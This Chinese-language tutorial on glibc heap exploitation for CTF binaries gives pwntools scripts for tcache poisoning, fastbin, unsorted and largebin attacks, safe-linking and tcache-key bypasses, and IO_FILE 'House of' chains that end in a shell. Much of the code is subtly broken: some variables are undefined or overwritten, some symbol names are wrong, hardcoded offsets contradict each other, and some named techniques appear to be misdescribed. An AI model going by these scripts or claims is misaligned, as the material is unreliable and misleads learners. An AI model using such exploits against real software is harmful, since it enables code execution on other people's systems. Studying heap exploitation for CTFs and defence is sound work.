# 堆利用基础 (Heap Basics)

## 原理

glibc 的堆管理器（ptmalloc）通过 bins（fastbin/smallbin/largebin/unsorted bin/tcache）管理空闲堆块。攻击者通过堆溢出、UAF、Double Free 等漏洞破坏堆块元数据，实现任意地址写、信息泄露、代码执行。

## 堆块结构

```c
// glibc malloc_chunk 结构
struct malloc_chunk {
    INTERNAL_SIZE_T      mchunk_prev_size;  // 前一个 chunk 大小（如果前一个 free）
    INTERNAL_SIZE_T      mchunk_size;        // 当前 chunk 大小 + flags
    struct malloc_chunk* fd;                 // 前向指针（free 时）
    struct malloc_chunk* bk;                 // 后向指针（free 时）
    struct malloc_chunk* fd_nextsize;        // largebin 用
    struct malloc_chunk* bk_nextsize;        // largebin 用
};

// flags
#define PREV_INUSE 0x1   // 前一个 chunk 在使用中
#define IS_MMAPPED 0x2   // mmap 分配
#define NON_MAIN_ARENA 0x4  // 非 main_arena
```

## Bins 分类

| Bin 类型 | 大小范围 | 数量 | 特点 |
|---------|---------|------|------|
| Fastbin | 0x20-0x80 (64位) | 10 | LIFO，单链表，不合并 |
| Smallbin | 0x20-0x3F0 | 62 | FIFO，双链表 |
| Largebin | 0x400+ | 63 | 按大小排序，双链表 |
| Unsorted Bin | 任意 | 1 | 临时存放，FIFO |
| Tcache | 0x20-0x410 (glibc 2.26+) | 64 | LIFO，单链表，无合并 |

## 攻击链

### 1. 堆布局

```python
from pwn import *

p = process('./pwn')

# 分配堆块
p.sendlineafter(b'>', b'1')  # malloc
p.sendlineafter(b'size:', b'0x20')

# 释放堆块
p.sendlineafter(b'>', b'2')  # free
p.sendlineafter(b'idx:', b'0')
```

### 2. 堆溢出

```python
# 堆块 A | 堆块 B
# 向 A 写入超过其大小的数据，覆盖 B 的元数据

# 分配两个相邻堆块
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1

# 溢出 idx 0，覆盖 idx 1 的 size
payload = b'A' * 0x20  # 填满 idx 0
payload += p64(0)       # prev_size
payload += p64(0x41)    # size（0x31 -> 0x41，扩大）
# 这样 free(idx 1) 时会释放更大的区域
```

### 3. Off-by-One

```python
# 只覆盖一个字节
# 通常覆盖 size 的最低字节

# 堆块 A (0x20) | 堆块 B (0x30)
# 向 A 写入 0x20 字节 + 1 字节
# 覆盖 B 的 size 最低字节

payload = b'A' * 0x20
payload += b'\x41'  # 覆盖 size 最低字节
```

### 4. UAF (Use After Free)

```python
# 释放后仍持有指针
malloc(0x20)  # idx 0
free(0)       # 释放
# 但仍能通过 idx 0 访问

# 利用：覆盖 fd 指针
malloc(0x20)  # idx 0
free(0)
# 此时 fd 指向 NULL（tcache 第一个）
# 通过 UAF 写入 fd
edit(0, p64(target_addr))
# 下次 malloc 返回 target_addr
malloc(0x20)  # idx 1，返回 tcache 中的块
malloc(0x20)  # idx 2，返回 target_addr
```

### 5. Double Free

```python
# 同一个 chunk 被 free 两次
# tcache double free (glibc < 2.29)
malloc(0x20)  # idx 0
free(0)
free(0)       # double free
# tcache: chunk -> chunk -> chunk -> ...
malloc(0x20)  # 返回 chunk
edit(0, p64(target_addr))  # 修改 fd
malloc(0x20)  # 返回 chunk
malloc(0x20)  # 返回 target_addr
```

### 6. Tcache Poisoning

```python
# glibc 2.26+
# 修改 tcache 的 fd 指针

malloc(0x20)  # idx 0
free(0)
# UAF 修改 fd
edit(0, p64(target_addr))
malloc(0x20)  # idx 1
malloc(0x20)  # idx 2，返回 target_addr
```

### 7. Fastbin Attack

```python
# glibc < 2.26 或 tcache 满了之后
# 修改 fastbin 的 fd 指针

# 1. 分配 7 个 0x70 的 chunk
for i in range(7):
    malloc(0x70)
malloc(0x70)  # idx 7
# 2. 释放 7 个填满 tcache
for i in range(7):
    free(i)
# 3. 释放 idx 7，进入 fastbin
free(7)
# 4. UAF 修改 fd
edit(7, p64(target_addr))
# 5. 分配 7 个清空 tcache
for i in range(7):
    malloc(0x70)
# 6. 分配得到 target_addr
malloc(0x70)  # 返回 fastbin 中的块
malloc(0x70)  # 返回 target_addr
```

### 8. Unsorted Bin Attack

```python
# 修改 unsorted bin 的 bk 指针
# 实现 main_arena 地址写入

# 1. 分配大 chunk
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 修改 bk
edit(0, p64(0) + p64(target_addr - 0x10))
# 4. 分配触发
malloc(0x400)
# target_addr 处被写入 main_arena 地址
```

### 9. Largebin Attack

```python
# 修改 largebin 的 bk_nextsize
# 实现任意地址写堆地址

# 1. 分配大 chunk
malloc(0x420)  # idx 0
malloc(0x20)   # idx 1
malloc(0x410)  # idx 2
malloc(0x20)   # idx 3
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. 分配大 chunk，触发 idx 0 进入 largebin
malloc(0x430)  # idx 4
# 4. 释放 idx 2
free(2)
# 5. 修改 idx 0 的 bk_nextsize
edit(0, ...)  # 修改 bk_nextsize = target_addr - 0x20
# 6. 分配触发
malloc(0x430)
# target_addr 处被写入堆地址
```

## 信息泄露

### 1. 泄露 libc 地址

```python
# 1. 分配大 chunk（大于 tcache 范围）
malloc(0x400)  # idx 0
malloc(0x20)   # idx 1，防止合并
# 2. 释放 idx 0，进入 unsorted bin
free(0)
# 3. UAF 读取 fd/bk
fd = u64(read(0, 8))
libc_base = fd - (libc.symbols['main_arena'] + 96)
```

### 2. 泄露堆地址

```python
# 1. 分配两个 chunk
malloc(0x20)  # idx 0
malloc(0x20)  # idx 1
# 2. 释放 idx 0
free(0)
# 3. UAF 读取 fd
fd = u64(read(0, 8))
heap_base = fd & ~0xfff
```

## 2024-2026 新技术点

### 1. glibc 2.34+ 无 hooks 堆利用

```python
# glibc 2.34+ 移除 __malloc_hook/__free_hook
# 堆利用转向 IO_FILE / exit_funcs / TLS 劫持

from pwn import *

context.arch = 'amd64'

def exploit_no_hooks():
    """glibc 2.34+ 无 hooks 的堆利用模板"""
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    def show(idx):
        p.sendlineafter(b'>', b'4')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # === 方案 1：tcache poisoning -> 覆盖 __exit_funcs ===
    malloc(0x20)   # idx 0
    malloc(0x20)   # idx 1 (guard)
    free(0)
    # 泄露堆地址
    show(0)
    heap_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.info(f"heap: {hex(heap_addr)}")
    
    # 计算 __exit_funcs 在 TLS 中的偏移
    exit_funcs_offset = -0x2d0  # 典型偏移，需根据实际 libc 确定
    exit_funcs_addr = libc_base + exit_funcs_offset  # 通过 TCB 偏移计算
    
    # tcache poisoning
    edit(0, p64(exit_funcs_addr))
    malloc(0x20)   # 返回原 chunk
    malloc(0x20)   # 返回 exit_funcs_addr
    # 覆盖 exit_funcs 指向伪造的 exit_function_list
    edit(2, p64(fake_exit_funcs_list))
    
    # 触发 exit，执行任意函数
    p.sendlineafter(b'>', b'5')  # 退出
    
    # === 方案 2：tcache poisoning -> IO_FILE ===
    # 构造 fake _IO_FILE_plus，覆盖 _IO_list_all
    # exit() 触发 _IO_flush_all_lockp -> 调用伪造 vtable
    
    # === 方案 3：利用 _environ 泄露栈地址后分配到栈 ===
    # 1. tcache poisoning 覆盖 _environ 的读取
    # 2. 通过 printf/read 等泄露栈地址
    # 3. 再次分配到栈上，覆盖返回地址
    
    p.interactive()
```

### 2. safe-linking 绕过 (glibc 2.32+)

```python
# glibc 2.32+ tcache/fastbin 指针加密
# fd_encrypted = (chunk_addr >> 12) ^ next_ptr

from pwn import *

context.arch = 'amd64'

class SafeLinkingBypass:
    """safe-linking 加密/解密工具"""
    
    @staticmethod
    def encrypt(chunk_addr, target):
        """加密 fd 指针"""
        return (chunk_addr >> 12) ^ target
    
    @staticmethod
    def decrypt(encrypted_fd, known_next):
        """解密 safe-linking fd
        
        加密: encrypted_fd = (chunk_addr >> 12) ^ next_ptr
        解密: chunk_addr = encrypted_fd ^ known_next
        """
        return encrypted_fd ^ known_next
    
    @staticmethod
    def leak_heap_via_safe_linking(fd_encrypted, known_next=0):
        """从加密的 fd 泄露 chunk 地址
        next=0 (tcache 最后一个块): heap = fd_encrypted << 12
        next 已知 (同 bin 前一个块): heap = fd_encrypted ^ known_next
        """
        if known_next == 0:
            return fd_encrypted << 12
        return fd_encrypted ^ known_next

def bypass_safe_linking(p, malloc, free, edit, show):
    """绕过 safe-linking 的完整利用"""
    # Step 1：泄露堆地址
    malloc(0x20)  # idx 0
    malloc(0x20)  # idx 1
    free(0)
    free(1)
    # tcache: idx1 -> idx0
    # 读取 idx1 的加密 fd
    show(1)
    encrypted_fd = u64(p.recv(6).ljust(8, b'\x00'))
    
    # idx0 的 next 是 NULL (tcache 最后一个)
    # encrypted_fd = (idx1_addr >> 12) ^ idx0_addr
    idx1_addr = SafeLinkingBypass.leak_heap_via_safe_linking(encrypted_fd)
    heap_base = idx1_addr & ~0xfff
    log.success(f"heap: {hex(heap_base)}")
    
    # Step 2：构造加密的 fd
    target = 0x404000  # 目标地址
    chunk_addr = heap_base + 0x290  # chunk 在堆上的地址
    encrypted = SafeLinkingBypass.encrypt(chunk_addr, target)
    
    # UAF 写入加密的 fd
    edit(0, p64(encrypted))
    
    # Step 3：分配得到 target
    malloc(0x20)  # 返回原 chunk
    malloc(0x20)  # 返回 target
```

### 3. tcache key 加固绕过 (glibc 2.29+)

```python
# glibc 2.29+ tcache entry 增加 key 字段
# key = tcache_perthread_struct 地址
# free 时检查 key 是否等于 tcache_perthread_struct

from pwn import *

context.arch = 'amd64'

def bypass_tcache_key():
    """绕过 tcache key 检测"""
    p = process('./pwn')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # === 方法 1：UAF 覆盖 key 为 0 ===
    malloc(0x20)  # idx 0
    free(0)
    # key 已被设置为 tcache_perthread_struct 地址
    # UAF 将 key 覆盖为 0，使 double free 检测失效
    edit(0, p64(target_addr) + p64(0))  # fd=target, key=0
    free(0)  # 第二次 free，key=0 != tcache_perthread，通过检测
    
    # === 方法 2：利用不同大小的 bin ===
    # tcache key 按 bin 隔离，同一个 chunk 通过修改 size 可以
    # 在不同 bin 间 double free
    malloc(0x20)  # idx 0
    free(0)
    # 修改 chunk size，使其属于不同的 tcache bin
    # 注意：glibc 2.34+ 对此也有检查
    
    # === 方法 3：House of Spirit ===
    # 在栈/BSS 上伪造 chunk，free 时 key 检查的是
    # chunk->key 是否等于 tcache_perthread_struct
    # 伪造 chunk 的 key 为 0 即可
    fake_chunk = b'/bin/sh\x00'  # 偏移 0x10
    fake_chunk = p64(0) + p64(0x31)  # prev_size + size
    fake_chunk += p64(0) * 2  # fd + key (key=0)
    # free(fake_chunk_addr + 0x10)
```

### 4. House of Apple 系列 (glibc 2.34+)

```python
# House of Apple 2：tcache/fastbin -> _IO_list_all -> _IO_wfile_overflow
# House of Apple 3：类似 Apple 2，利用不同的 IO 函数

from pwn import *

context.arch = 'amd64'

def house_of_apple2():
    """
    步骤：
    1. 通过 tcache/fastbin 分配到 _IO_list_all 附近
    2. 伪造 fake _IO_FILE_plus 结构体
    3. 触发 _IO_flush_all_lockp（exit 或 malloc 错误）
    4. _IO_wfile_overflow 检查 _wide_data->_IO_write_base
    5. 如果 _IO_write_base != _IO_write_ptr，调用 _IO_wdoallocbuf
    6. _IO_wdoallocbuf 调用 _wide_data->_wide_vtable->__doallocate
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # 需要的关键地址
    system_addr = libc_base + libc.symbols['system']
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    _IO_wfile_overflow = libc_base + libc.symbols['_IO_wfile_offset']  
    libc_csu_init = libc_base + 0x29e40  # _IO_wfile_overflow
    
    # 构造 fake _IO_FILE_plus
    # 详细构造见 io-file-attacks.md
    
    # 覆盖 _IO_list_all 指向 fake IO_FILE
    # 触发 _IO_flush_all_lockp
    payload = p64(0)  # prev_size
    payload += p64(0x91)  # size
    payload += p64(0)  # fd (tcache next)
    payload += p64(0)  # bk
    # fake _IO_FILE_plus fields
    payload += p64(0xfbad1800)  # _flags
    payload += p64(0) * 3  # _IO_read_ptr, _IO_read_end, _IO_write_base
    payload += p64(_IO_list_all - 0x20)  # _IO_write_ptr (largebin offset trick)
    payload += p64(0) * 4
    payload += p64(0)  # _chain
    payload += p64(0)  # _fileno
    payload += p64(0) * 8  # other fields
    payload += p64(libc_base + libc.symbols['_IO_wfile_jumps'])  # vtable
```

### 5. House of Cat (glibc 2.35+)

```python
# House of Cat：利用 largebin attack + _IO_wfile_overflow
# 2024 年 CTF 中常见的利用链

from pwn import *

context.arch = 'amd64'

def house_of_cat():
    """
    步骤：
    1. largebin attack 修改 _IO_list_all
    2. 伪造 fake _IO_FILE_plus
    3. 触发 _IO_flush_all_lockp
    4. 通过 _IO_wfile_overflow 执行 shellcode
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size, idx=None):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    # Step 1: largebin attack
    # 分配进入 largebin 的 chunk
    malloc(0x420)  # idx 0
    malloc(0x20)   # idx 1
    malloc(0x410)  # idx 2
    malloc(0x20)   # idx 3
    free(0)
    malloc(0x430)  # idx 4 - 触发 idx 0 进入 largebin
    free(2)
    # 修改 idx 0 的 bk_nextsize
    # edit(0, ...)  # bk_nextsize = target - 0x20
    
    # Step 2: 构造 fake IO_FILE
    # 详细构造见 io-file-attacks.md
    
    # Step 3: 触发执行
    p.interactive()
```

### 6. per-thread cache 多线程利用

```python
# 多线程环境中，每个线程有独立的 tcache
# 同一个 chunk 可能出现在不同线程的 tcache 中

from pwn import *

context.arch = 'amd64'

def multithreaded_tcache_exploit():
    """多线程 tcache 利用"""
    # 场景：程序使用多线程 malloc/free
    # 攻击思路：
    # 1. 在线程 A 中释放 chunk
    # 2. 在线程 B 中通过 UAF 修改 fd
    # 3. 线程 A 或 B 分配时返回目标地址
    
    # 线程安全注意：
    # - tcache 操作本身是 per-thread 的，不需要加锁
    # - 但 tcache_perthread_struct 的 counts 可能竞争
    # - 竞态条件可导致 double free（TOCTOU）
    
    # 利用 tcache 竞态条件
    def race_condition_double_free():
        """通过竞态条件实现 tcache double free"""
        # 线程 1：free(chunk)
        # 线程 2：free(chunk) -- 在线程 1 的 free 完成前执行
        # 两个线程都通过 key 检查（key 还未被设置）
        pass
```

### 7. 现代编译器优化对堆的影响

```python
# GCC 13+/Clang 17+ 对堆操作的影响

from pwn import *

def modern_compiler_heap_effects():
    """编译器优化对堆利用的影响"""
    # 1. 栈变量优化到寄存器
    #    - 堆指针可能不在栈上，无法通过栈溢出覆盖
    #    - 需要通过堆漏洞本身进行利用
    
    # 2. CFG (Control Flow Graph) 优化
    #    - 可能改变函数调用顺序
    #    - 可能删除"无用"的 free 调用
    #    - 需要注意优化后的实际代码流
    
    # 3. 安全函数替换
    #    - gets -> __gets_chk
    #    - strcpy -> __strcpy_chk
    #    - 这些替换可能改变漏洞行为
    
    # 应对策略：
    # 1. 使用 Ghidra/IDA 反编译查看实际代码
    # 2. 在 GDB 中单步调试确认行为
    # 3. 注意编译器的 _FORTIFY_SOURCE 行为
    
    # 实际应对：使用反编译结果指导利用
    from pwn import *
    context.arch = 'amd64'
    p = process('./pwn')
    elf = ELF('./pwn')
    libc = ELF('./libc.so.6')
    
    # 用 GDB 验证编译器优化后的代码流
    # gdb.attach(p, '''
    #     b main
    #     c
    #     disas vulnerable_function
    # ''')
    
    # 根据反编译结果编写利用，而非依赖源码
    # FORTIFY_SOURCE 下 gets -> __gets_chk 有 canary 检查
    # 需要确认栈布局是否仍可利用
    log.info(f"Binary protections: {elf.checksec()}")
```

### 8. 硬件级防护对堆利用的影响

```python
# Intel CET / ARM PAC+BTI / ARM MTE 对堆利用的影响

from pwn import *

def hardware_protection_heap_impact():
    """硬件防护对堆利用的影响与绕过"""
    
    # === MTE (Memory Tagging Extension) ===
    # 每 16 字节有一个 4-bit tag
    # 堆块分配时随机设置 tag
    # 访问时检查 tag 是否匹配
    
    def mte_bypass():
        """MTE 绕过思路"""
        # 1. Tag reuse：同一 tag 重复使用
        # 2. Partial overwrite：只覆盖指针低位，保留 tag
        # 3. 引用计数攻击：通过 largebin 等延长 chunk 生命周期
        # 4. 侧信道：通过 timing 侧信道泄露 tag 值
        pass
    
    # === CET Shadow Stack ===
    # 返回地址在影子栈上维护副本
    # ret 时校验两个返回地址是否一致
    
    def cet_bypass():
        """CET 绕过思路"""
        # 1. 不使用 ret 控制流：用 call/jmp/longjmp
        # 2. 泄露影子栈内容
        # 3. 利用 sigreturn 修改影子栈
        pass
    
    # === ARM PAC ===
    # 指针高位存储认证码
    # 用于保护函数返回地址（FPAC）和数据指针（APAC）
    
    def pac_bypass():
        """PAC 绕过思路"""
        # 1. 利用 PAC oracle 侧信道
        # 2. 部分覆盖绕过签名区域
        # 3. 利用合法签名指针（从内存中读取）
        pass
```

### 9. 沙箱环境堆利用

```python
# seccomp 沙箱限制下的堆利用

from pwn import *

context.arch = 'amd64'

def heap_exploit_with_seccomp():
    """seccomp 限制 execve 时的堆利用"""
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    # 1. 堆利用获取任意写原语
    # tcache poisoning / fastbin attack
    
    # 2. 覆盖目标：_IO_write_base / _IO_write_ptr
    # 控制 IO 输出方向，泄露数据
    
    # 3. 覆盖目标：exit_funcs
    # 构造 ORW ROP 链
    
    # 4. 触发 exit，执行 ORW
    # open("flag", O_RDONLY) -> read(fd, buf, size) -> write(1, buf, size)
    
    # 常见 seccomp 规则分析
    # 使用 seccomp-tools 查看限制
    # seccomp-tools dump ./pwn
    
    p.interactive()
```

### 10. 新型利用链 (2024-2026)

```python
# 2024-2026 年 CTF 中的新型堆利用链

from pwn import *

context.arch = 'amd64'

# === House of Banana ===
# glibc 2.34+，通过 __exit_funcs 实现 RCE
def house_of_banana():
    """
    1. 通过 tcache/fastbin 任意分配
    2. 覆盖 _IO_list_all -> fake IO_FILE
    3. 在 fake IO_FILE 中布置 _wide_data
    4. 触发 _IO_wfile_overflow -> _IO_wdoallocbuf
    5. _IO_wdoallocbuf 调用 _wide_vtable->__doallocate
    6. 通过修改 _wide_data 控制执行流
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # 1. 泄露 libc
    malloc(0x420)   # idx 0, 进 unsorted bin
    free(0)
    malloc(0x420)   # idx 1
    edit(0, b'A' * 8)  # 触发 fd/bk 泄露
    libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = libc_leak - 0x1ec980  # offset to unsorted bin fd
    log.success(f"libc base: {hex(libc_base)}")
    
    # 2. tcache poisoning 覆盖 _IO_list_all
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    malloc(0x20)   # fill tcache
    for i in range(7):
        free(1)
    malloc(0x20)   # idx 1 from tcache
    # 修改 fd -> _IO_list_all - 0x20
    edit(1, p64(0) * 2 + p64(0) + p64(_IO_list_all - 0x20))
    malloc(0x20)   # idx 2
    malloc(0x20)   # idx 3 -> _IO_list_all area
    
    # 3. 覆盖 _IO_list_all
    system_addr = libc_base + libc.symbols['system']
    edit(3, b'/bin/sh\x00' + p64(0xfbad1800) + p64(0) * 10)
    
    # 4. exit() 触发 _IO_flush_all_lockp -> _IO_wfile_overflow -> shell
    p.sendlineafter(b'>', b'5')  # exit
    p.interactive()

# === House of Emu (glibc 2.36+) ===
def house_of_emu():
    """
    glibc 2.36+ 的新利用方式
    利用 _IO_wstrn_jumps 等新 vtable
    绕过 2.34+ 的 vtable 范围检查
    """
    p = process('./pwn')
    libc = ELF('./libc.so.6')
    
    def malloc(size):
        p.sendlineafter(b'>', b'1')
        p.sendlineafter(b'size:', str(size).encode())
    
    def free(idx):
        p.sendlineafter(b'>', b'2')
        p.sendlineafter(b'idx:', str(idx).encode())
    
    def edit(idx, data):
        p.sendlineafter(b'>', b'3')
        p.sendlineafter(b'idx:', str(idx).encode())
        p.sendafter(b'data:', data)
    
    # House of Emu: 利用 _IO_wstrn_jumps（在合法 vtable 范围内）
    # glibc 2.36+ 新增的 vtable，绕过 _IO_wfile_jumps 的限制
    
    # 1. 泄露地址
    malloc(0x420)
    free(0)
    malloc(0x420)
    edit(0, b'A' * 8)
    leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc_base = leak - 0x1ec980
    
    # 2. tcache poisoning 分配到 _IO_list_all 附近
    _IO_list_all = libc_base + libc.symbols['_IO_list_all']
    _IO_wstrn_jumps = libc_base + 0x216e00  # glibc 2.36+ 偏移
    
    for i in range(7):
        free(0)
    edit(0, p64(_IO_list_all - 0x20))
    malloc(0x20)
    malloc(0x20)  # -> _IO_list_all 区域
    
    # 3. 构造 fake IO_FILE 使用 _IO_wstrn_jumps
    shellcode = asm(shellcraft.sh())
    # fake vtable with __doallocate pointing to shellcode
    fake_vtable = p64(0) * 20  # pad to __doallocate offset
    # 在可控内存放置 shellcode 和 fake vtable
    
    p.interactive()

# === 模块化利用框架 ===
class HeapExploitFramework:
    """通用堆利用框架 (2024+)"""
    
    def __init__(self, p, elf, libc):
        self.p = p
        self.elf = elf
        self.libc = libc
        self.leaked = {}
    
    def step1_leak(self):
        """信息泄露"""
        # 泄露 libc 地址（unsorted bin fd/bk）
        # 泄露堆地址（tcache fd）
        # 泄露栈地址（_environ）
        pass
    
    def step2_arbitrary_write(self):
        """任意写原语"""
        # tcache poisoning (glibc 2.26+)
        # fastbin attack (glibc < 2.26 or after tcache fill)
        # largebin attack
        # unsorted bin attack (glibc < 2.34)
        pass
    
    def step3_target_overwrite(self, target='exit_funcs'):
        """覆盖目标"""
        if target == 'exit_funcs':
            # 覆盖 TLS 中的 __exit_funcs
            pass
        elif target == 'io_list_all':
            # 覆盖 _IO_list_all，构造 fake IO_FILE
            pass
        elif target == 'tls':
            # 覆盖 TLS 中的 __stack_chk_guard 等
            pass
    
    def step4_trigger(self):
        """触发执行"""
        # exit() / return / 异常
        pass
```

## 工具推荐

- **pwntools** — Python 利用框架
- **gdb + pwndbg** — 动态调试（heap/bins 命令）
- **gdb + gef** — 动态调试
- **heap-viewer** — 堆可视化
- **LibcSearcher** — libc 版本识别

## 参考链接

- [ctf-wiki heap](https://ctf-wiki.org/pwn/linux/glibc-heap/)
- [glibc malloc](https://sourceware.org/glibc/wiki/MallocInternals)
- [Shellphish Heap Exploitation](https://github.com/shellphish/how2heap)
- [Heap Exploitation Part 1](https://blog.infosectc.com.br/heap-exploitation-part-1-understanding-the-glibc-heap-implementation)
